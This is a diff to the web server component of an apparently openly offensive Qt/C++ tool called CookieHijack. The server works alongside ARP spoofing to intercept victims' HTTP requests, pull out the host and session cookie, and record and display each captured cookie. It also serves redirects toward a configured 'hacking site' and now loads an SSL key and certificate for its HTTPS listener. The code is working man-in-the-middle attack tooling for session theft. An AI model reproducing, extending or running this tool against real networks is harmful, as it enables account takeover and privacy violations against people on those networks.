@@ -1,6 +1,8 @@
 #include "webserver.h"
 #include "cookiehijack.h"
 
+#include <QSslKey>
+
 WebServer::WebServer(QObject *parent) : GStateObj(parent) {
 	ch_ = dynamic_cast<CookieHijack*>(parent);
 	Q_ASSERT(ch_ != nullptr);
@@ -23,12 +25,38 @@ bool WebServer::doOpen() {
 	if (sslServer_ != nullptr)
 		delete sslServer_;
 	sslServer_ = new QSslServer(this);
+
+	QSslConfiguration sslConfiguration(QSslConfiguration::defaultConfiguration());
+
+	QFile keyFile(keyFileName_);
+	if (!keyFile.open(QIODevice::ReadOnly)) {
+		SET_ERR(GErr::Fail, QString("can not open key file %1").arg(keyFileName_));
+		return false;
+	}
+	QSslKey sslKey(&keyFile, QSsl::Rsa);
+	sslConfiguration.setPrivateKey(sslKey);
+	keyFile.close();
+
+
+	QFile crtFile(crtFileName_);
+	if (!crtFile.open(QIODevice::ReadOnly)) {
+		SET_ERR(GErr::Fail, QString("can not open crt file %1").arg(crtFileName_));
+		return false;
+	}
+	QSslCertificate sslCertificate(&crtFile);
+	sslConfiguration.setLocalCertificate(sslCertificate);
+	crtFile.close();
+
+	sslServer_->setSslConfiguration(sslConfiguration);
+
 	prepareTcpServer(sslServer_);
 	prepareSslServer(sslServer_);
 	if (!sslServer_->listen(QHostAddress::AnyIPv4, httpsPort_)) {
 		SET_ERR(GErr::Fail, sslServer_->errorString());
 		return false;
 	}
+
+	reSiteNo_.setPattern("GET /([0-9]*)");
 
 	return true;
 }
@@ -48,7 +76,6 @@ bool WebServer::doClose() {
 
 	return true;
 }
-
 
 void WebServer::prepareAbstractSocket(QAbstractSocket* socket) {
 	// QIODevice
@@ -81,59 +108,80 @@ void WebServer::prepareSslServer(QSslServer* server) {
 	QObject::connect(server, &QSslServer::startedEncryptionHandshake, this, &WebServer::serverStartedEncryptionHandshake);
 }
 
-#include "chwidget.h"
 void WebServer::doReadyRead() {
 	qDebug() << "";
 	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
 	Q_ASSERT(socket != nullptr);
+	QTcpSocket* tcpSocket = dynamic_cast<QTcpSocket*>(socket);
+	Q_ASSERT(tcpSocket != nullptr);
+	QSslSocket* sslSocket = dynamic_cast<QSslSocket*>(socket);
 
-	segments_[socket] += socket->readAll();
-	QString httpRequest = segments_[socket];
+	Map::Iterator it = segments_.find(socket);
+	if (it == segments_.end())
+		it = segments_.insert(socket, QString());
+	QString& httpRequest = it.value();
+	httpRequest += socket->readAll();
 	qDebug() << httpRequest;
+
+
+	if (sslSocket == nullptr) {
+		if (httpRequest.startsWith("\u0016")) {
+			qDebug() << "TLS Handshake!!!(0x16)!!!";
+			socket->close();
+			return;
+		}
+	}
+
 	GIp ip = socket->peerAddress().toString();
+
+	// if (sslSocket == nullptr)
+	// 	tcpPreReadyRead(tcpSocket, httpRequest);
+	// else
+	// 	sslPreReadyRead(sslSocket);
 
 	QString host, cookie;
 	if (ch_->cookieHijack_.extract(httpRequest, host, cookie)) {
-		segments_[socket] = "";
 		qDebug() << "\n" << host << "\n" << cookie;
 
-		time_t created = QDateTime::currentDateTime().toSecsSinceEpoch();
+		QDateTime now = QDateTime::currentDateTime();
+		doHijacked(now.toSecsSinceEpoch(), GMac::nullMac(), ip, host, cookie);
+		time_t created = now.toSecsSinceEpoch();
 		ch_->cookieHijack_.insert(created, GMac::nullMac(), ip, host, cookie);
-
-		ChWidget* chWidget = dynamic_cast<ChWidget*>(ch_->parent());
-		Q_ASSERT(chWidget != nullptr);
-		chWidget->addItem(host, cookie);
 	}
 
-	if (httpRequest.startsWith("\u0016")) {
-		qDebug() << "TLS Handshake!!!(0x16)!!!";
-		socket->close();
-		return;
-	}
-
-	qsizetype i = httpRequest.indexOf("\r\n\r\n");
-	if (i == -1) return;
+	if (httpRequest.indexOf("\r\n\r\n") == -1) return;
 	qDebug() << "found \\r\\n\\r\\n";
-	if (hijackSsl_) {
-		QStringList httpResponse;
-		httpResponse += "HTTP/1.1 302 Redirect";
-		QString locationStr =  QString("Location: https://%1.%2").arg(ch_->prefix_).arg(ch_->hackingSite_);
-		if (httpsPort_ != 443) locationStr += ":" + QString::number(httpsPort_);
-		httpResponse += locationStr;
-		httpResponse += "Connection: close";
-		httpResponse += "";
-		httpResponse += "";
-		socket->write(httpResponse.join("\r\n").toUtf8());
-		qDebug() << "Try " + locationStr;
+
+	bool goodbye = false;
+
+	QRegularExpressionMatch m = reSiteNo_.match(httpRequest);
+	QString strSiteNo = m.captured(1);
+	int siteNo = 0;
+	if (strSiteNo == "") {
+		qWarning() << "strSiteNo is null";
 	} else {
-		socket->write(goodbyeMessage_.join("\r\n").toUtf8());
+		qDebug() << "strSiteNo=" + strSiteNo;
+		siteNo = m.captured(1).toInt();
+	}
+
+	QStringList httpResponse = ch_->getHttpResponse(siteNo + 1);
+	if (httpResponse.isEmpty()) {
+		goodbye = true;
+	} else {
+		socket->write(httpResponse.join("\r\n").toUtf8());
+		socket->close();
+	}
+
+	if (goodbye) {
+		qDebug() << "Remove flows for " + QString(ip);
 		GIntf* intf = ch_->autoArpSpoof_.intf();
 		Q_ASSERT(intf != nullptr);
 		GIp gateway = intf->gateway();
-		qDebug() << "Remove flows " + QString(ip);
 		ch_->autoArpSpoof_.removeFlows(ip, gateway, gateway, ip);
+		socket->write(goodbyeMessage_.join("\r\n").toUtf8());
+		socket->close();
+		return;
 	}
-	socket->close();
 }
 
 void WebServer::doConnected() {
@@ -230,3 +278,34 @@ void WebServer::serverStartedEncryptionHandshake(QSslSocket* socket) {
 	(void)socket;
 	qDebug() << "";
 }
+
+#include "chwidget.h"
+void WebServer::doHijacked(time_t created, GMac mac, GIp ip, QString host, QString cookie) {
+	(void)created;
+	(void)mac;
+	(void)ip;
+	ChWidget* chWidget = dynamic_cast<ChWidget*>(ch_->parent());
+	Q_ASSERT(chWidget != nullptr);
+	chWidget->addItem(host, cookie);
+}
+
+#ifdef QT_GUI_LIB
+
+#include "base/prop/gpropitem-filepath.h"
+GPropItem* WebServer::propCreateItem(GPropItemParam* param) {
+	if (QString(param->mpro_.name()) == "keyFileName") {
+		GPropItemFilePath* res = new GPropItemFilePath(param);
+		QStringList filters{"key files - *.key(*.key)", "any files - *(*)"};
+		res->fd_->setNameFilters(filters);
+		return res;
+	}
+	if (QString(param->mpro_.name()) == "crtFileName") {
+		GPropItemFilePath* res = new GPropItemFilePath(param);
+		QStringList filters{"crt files - *.crt(*.crt)", "any files - *(*)"};
+		res->fd_->setNameFilters(filters);
+		return res;
+	}
+	return GObj::propCreateItem(param);
+}
+
+#endif // QT_GUI_LIB
